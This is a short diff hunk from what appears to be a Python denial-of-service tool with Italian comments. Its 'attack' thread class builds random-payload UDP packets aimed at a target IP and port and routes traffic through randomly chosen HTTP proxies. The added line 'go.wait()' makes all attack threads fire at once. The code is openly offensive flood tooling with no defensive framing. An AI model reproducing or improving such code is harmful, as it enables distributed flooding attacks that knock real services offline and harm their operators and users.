@@ -350,6 +350,7 @@ class attack(threading.Thread): # la classe del multithreading
 		data = random._urandom(1024) # data per il pacchetto random
 		p = bytes(IP(dst=str(iptarget))/UDP(dport=int(port))/data) # crea pacchetto udp classico + data
 		proxy = random.choice(entries).strip().split(":") # seleziona un proxy a random
+		go.wait()
 		while True:
 			try:
 				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) # comando per il proxying HTTP
